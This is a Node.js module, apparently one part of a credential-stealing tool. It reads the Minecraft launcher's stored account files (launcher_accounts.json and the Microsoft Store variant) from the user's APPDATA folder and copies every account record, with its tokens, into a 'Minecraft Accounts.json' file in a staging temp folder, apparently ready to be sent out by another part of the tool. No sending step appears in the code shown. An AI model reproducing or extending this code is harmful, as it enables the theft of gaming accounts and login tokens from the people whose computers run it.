const { join, sep } = require('path');
const { tempFolder } = require('../index');
const { existsSync, readFileSync, writeFileSync } = require('fs');

const jsonFile = join(tempFolder, 'Minecraft Accounts.json');
const paths = [
  join(process.env.APPDATA, '.minecraft', 'launcher_accounts.json'),
  join(process.env.APPDATA, '.minecraft', 'launcher_accounts_microsoft_store.json'),
];

paths.forEach(file => {
  if (existsSync(file)) {
    const { accounts } = JSON.parse(readFileSync(file, 'utf8'));
    const accountsFile = JSON.parse(existsSync(jsonFile) ? readFileSync(jsonFile, 'utf8') : '[]');
    Object.keys(accounts).forEach(account => {
      accounts[account].source = file.split(sep).slice(5, -1)[0].replace('.', '') || 'Unknown';
      const source = accounts[account].source;
      accounts[account].source = source.replace(source[0], source[0].toUpperCase());
      accountsFile.push(accounts[account]);
    });
    writeFileSync(jsonFile, JSON.stringify(accountsFile));
  }
});
